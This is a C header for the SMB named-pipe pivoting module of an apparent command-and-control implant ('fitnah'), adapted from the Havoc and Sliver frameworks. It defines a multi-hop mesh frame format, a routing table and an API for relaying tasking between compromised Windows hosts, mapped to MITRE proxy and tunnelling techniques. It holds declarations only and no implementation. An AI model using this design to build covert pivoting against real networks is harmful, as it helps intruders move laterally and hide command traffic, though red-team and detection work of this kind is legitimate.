/*
 * smb_pivot.h — SMB named pipe P2P pivot — multi-hop mesh edition
 *
 * Adapted from HavocFramework/Havoc (MIT) + BishopFox/Sliver peer-to-peer
 * routing concepts (Apache 2.0).
 *
 * ┌─────────────────────────────────────────────────────────────────┐
 * │  Multi-hop wire frame (replaces old [len:4][payload]):          │
 * │  [MAGIC:4][dst_id:4][src_id:4][ttl:1][payload_len:4][payload]  │
 * │                                                                 │
 * │  MAGIC = 0x46495448 ("FITH")                                   │
 * │  dst_id: destination agent_id (0 = this node)                  │
 * │  src_id: originating agent_id                                   │
 * │  ttl:    hops remaining (max 15, decremented at each relay)     │
 * │  payload: the TASK/ACK/CHECKIN JSON bytes                       │
 * └─────────────────────────────────────────────────────────────────┘
 *
 * Routing table: each entry maps   dst_id → via_agent_id
 * The relay loop walks the routing table to forward frames to the
 * correct pipe without the operator configuring every hop manually.
 *
 * MITRE: T1090.001 (Proxy: Internal Proxy — named pipe)
 *        T1572     (Protocol Tunneling)
 */
#pragma once
#include <windows.h>
#include <stdint.h>

/* ── Wire constants ──────────────────────────────────────────────────────── */
#define FITNAH_PIPE_PREFIX       L"\\\\.\\pipe\\fitnah_"
#define MAX_PIVOT_PACKET         (4 * 1024 * 1024)  /* 4 MB max payload   */
#define MAX_SMB_PACKETS_PER_LOOP 30
#define MESH_MAGIC               0x46495448u         /* "FITH" LE          */
#define MESH_HEADER_SIZE         17                  /* magic+dst+src+ttl+len */
#define MESH_TTL_DEFAULT         15

/* ── Pivot node ──────────────────────────────────────────────────────────── */
typedef struct _PIVOT_NODE {
    uint32_t           agent_id;
    wchar_t            pipe_name[256];
    HANDLE             handle;
    BOOL               is_server;
    struct _PIVOT_NODE *next;
} PIVOT_NODE, *PPIVOT_NODE;

/* ── Routing table entry ─────────────────────────────────────────────────── */
#define MAX_ROUTES 64

typedef struct {
    uint32_t dst_agent_id;   /* destination node                  */
    uint32_t via_agent_id;   /* direct-neighbour pivot to forward through */
} ROUTE_ENTRY;

/* globals — guarded by g_pivot_lock */
extern PPIVOT_NODE      g_pivots;
extern CRITICAL_SECTION g_pivot_lock;
extern ROUTE_ENTRY      g_routes[MAX_ROUTES];
extern int              g_route_count;
extern uint32_t         g_my_agent_id;  /* this node's own ID */

/* ── Public API ──────────────────────────────────────────────────────────── */

/* Initialise subsystem; call once with this agent's own ID */
void     PivotInit(uint32_t my_agent_id);

/* Create a named pipe server; return assigned child agent_id (0 = fail) */
uint32_t PivotListen(const wchar_t *pipe_suffix);

/* Connect to an existing named pipe as a client (child-side) */
uint32_t PivotConnect(const wchar_t *full_pipe_name);

/* Send a raw payload (wraps it in the mesh frame) to agent dst_agent_id.
 * If dst_agent_id == 0 or == g_my_agent_id the payload is delivered locally
 * (returned via PivotPoll).  Otherwise it is forwarded via the routing table. */
BOOL     PivotSend(uint32_t dst_agent_id, const void *payload, uint32_t payload_len);

/* Send a pre-built mesh frame as-is (internal use by relay) */
BOOL     PivotSendRaw(uint32_t via_agent_id, const void *frame, uint32_t frame_len);

/* Add a routing table entry: to reach dst, forward through via */
BOOL     PivotAddRoute(uint32_t dst_agent_id, uint32_t via_agent_id);

/* Remove a routing table entry */
BOOL     PivotDelRoute(uint32_t dst_agent_id);

/*
 * PivotPoll — drain up to MAX_SMB_PACKETS_PER_LOOP mesh frames from every
 * active pivot.  Frames destined for this node are extracted as plain payload
 * and returned in the caller buffer.  Frames for other nodes are automatically
 * forwarded (relayed).
 *
 * Returns heap-allocated buffer of plain payloads (no mesh headers) destined
 * for this node, length-prefixed [uint32 LE len][payload...].
 * Caller must free().  *total_bytes receives total byte count.
 */
void    *PivotPoll(uint32_t *total_bytes);

/* Disconnect and free a pivot node */
BOOL     PivotRemove(uint32_t agent_id);

/* Number of active pivot nodes */
uint32_t PivotCount(void);

/* Heap-allocated JSON array of active pivots */
char    *PivotListJson(void);

/* Heap-allocated JSON array of routing table */
char    *PivotRoutesJson(void);
